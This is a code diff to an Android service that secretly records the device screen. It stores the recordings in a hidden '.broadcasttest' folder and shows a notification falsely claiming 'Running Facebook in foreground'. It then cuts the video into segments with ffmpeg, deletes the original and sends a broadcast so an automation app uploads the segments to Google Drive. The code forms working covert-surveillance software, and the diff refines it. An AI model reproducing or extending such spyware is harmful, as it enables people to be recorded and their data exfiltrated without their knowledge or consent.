@@ -44,12 +44,8 @@ public class ExampleService extends Service {
     private final int audioBitrate = 128000;
     private final int audioSamplingRate = 44100;// Hz
 
-    private final boolean isVideoHD = false;
     private final boolean isAudioEnabled = false;
-    private final boolean isCustomSettingsEnabled = true;
-    private boolean hasMaxFileBeenReached = false;
 
-    private int orientationHint = 400;
     private int mScreenDensity;
     private int mScreenWidth;
     private int mScreenHeight;
@@ -76,6 +72,8 @@ public class ExampleService extends Service {
     public void onDestroy() {
         super.onDestroy();
         Toast.makeText(this, TAG + " stopped", Toast.LENGTH_LONG).show();
+
+        //clear and free all the stuff that was used for the recording
         Log.d(TAG, "onDestroy");
         if (mVirtualDisplay != null) {
             mVirtualDisplay.release();
@@ -89,9 +87,79 @@ public class ExampleService extends Service {
             mMediaProjection.stop();
             mMediaProjection = null;
         }
+
+        //segmentate the the recording file into small chunks in order to send them
+        //using the 'ffmpeg-kit' Android library which implements the 'ffmpeg' unix command
         FFmpegUsage ffmpeg = new FFmpegUsage(fileName);
+        //delete the source recording file
         DeleteFile(filePath);
+        //Send Broadcast message that is received by 'Automate'
+        //which alerts 'Automate' to sync the segments to Google Drive
         SendSyncBroadcast(ffmpeg.getFolderPath());
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+
+        Toast.makeText(this, TAG + " started", Toast.LENGTH_SHORT).show();
+        Log.d(TAG, "onStartCommand");
+
+        //on Android 10 only works if it is VOICE RECOGNITION
+        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            audioSourceAsInt = MediaRecorder.AudioSource.VOICE_RECOGNITION;
+        } else {
+            audioSourceAsInt = MediaRecorder.AudioSource.MIC;
+        }
+
+        //get information and parameters from intent to be used for recording
+        mIntent = intent;
+        mScreenWidth = intent.getIntExtra("width", 0);
+        mScreenHeight = intent.getIntExtra("height", 0);
+        mScreenDensity = intent.getIntExtra("density", 1);
+        //IMPORTANT! must be OK in order to init MediaProjection successfully
+        mResultCode = intent.getIntExtra("resultCode", -1);
+        mResultData = intent.getParcelableExtra("data");
+
+        //create notification
+        createNotification();
+
+        //Create hidden folder '.broadcasttest' where recordings are stored
+        try {
+            setPathAndName();
+            createFolder();
+        } catch (Exception e) {
+            Log.e(TAG, "Error on creating folder: " + e.getMessage());
+        }
+
+        //create MediaRecorder to prepare for recording the screen
+        try {
+            initRecorder();
+        } catch (Exception e) {
+            Log.e(TAG, "Error on init Recorder: " + e.getMessage());
+        }
+
+        //create MediaProjection
+        try {
+            initMediaProjection();
+        } catch (Exception e) {
+            Log.e(TAG, "Error on init MediaProjection: " + e.getMessage());
+        }
+
+        //create VirtualDisplay that is to be recorded
+        try {
+            initVirtualDisplay();
+        } catch (Exception e) {
+            Log.e(TAG, "Error on init VirtualDisplay: " + e.getMessage());
+        }
+
+        //start recording the screen
+        try {
+            mMediaRecorder.start();
+        } catch (Exception e) {
+            Log.e(TAG, "Error on start Recording" + e.getMessage());
+        }
+
+        return Service.START_STICKY;
     }
 
     private void SendSyncBroadcast(String folderPath) {
@@ -123,12 +191,8 @@ public class ExampleService extends Service {
         SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss", Locale.getDefault());
         Date curDate = new Date(System.currentTimeMillis());
         String curTime = formatter.format(curDate).replace(" ", "");
-        String videoQuality = "HD";
-        if (!isVideoHD) {
-            videoQuality = "SD";
-        }
 
-        String name = videoQuality + curTime;
+        String name = "SESS" + curTime;
 
         fileName = name + ".mp4";
 
@@ -195,7 +259,6 @@ public class ExampleService extends Service {
         final String notificationTitle = "Facebook";
         final String notificationDescription = "Running Facebook in foreground";
 
-        //Notification
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             String channelId = "001";
             String channelName = "FacebookChannel";
@@ -219,65 +282,5 @@ public class ExampleService extends Service {
         }
     }
 
-    @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
 
-        Toast.makeText(this, TAG + " started", Toast.LENGTH_SHORT).show();
-        Log.d(TAG, "onStartCommand");
-
-        //on POT.. only works voice recognition
-        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            audioSourceAsInt = MediaRecorder.AudioSource.VOICE_RECOGNITION;
-        } else {
-            audioSourceAsInt = MediaRecorder.AudioSource.MIC;
-        }
-
-        mIntent = intent;
-        mScreenWidth = intent.getIntExtra("width", 0);
-        mScreenHeight = intent.getIntExtra("height", 0);
-        mScreenDensity = intent.getIntExtra("density", 1);
-        mResultCode = intent.getIntExtra("resultCode", -1);
-        mResultData = intent.getParcelableExtra("data");
-
-        //create notification
-        createNotification();
-
-        //Create folder and file info
-        try {
-            setPathAndName();
-            createFolder();
-        } catch (Exception e) {
-            Log.e(TAG, "Error on creating folder: " + e.getMessage());
-        }
-
-        //Init MediaRecorder
-        try {
-            initRecorder();
-        } catch (Exception e) {
-            Log.e(TAG, "Error on init Recorder: " + e.getMessage());
-        }
-
-        //Init MediaProjection
-        try {
-            initMediaProjection();
-        } catch (Exception e) {
-            Log.e(TAG, "Error on init MediaProjection: " + e.getMessage());
-        }
-
-        //Init VirtualDisplay
-        try {
-            initVirtualDisplay();
-        } catch (Exception e) {
-            Log.e(TAG, "Error on init VirtualDisplay: " + e.getMessage());
-        }
-
-        //Start Recording
-        try {
-            mMediaRecorder.start();
-        } catch (Exception e) {
-            Log.e(TAG, "Error on start Recording" + e.getMessage());
-        }
-
-        return Service.START_STICKY;
-    }
 }
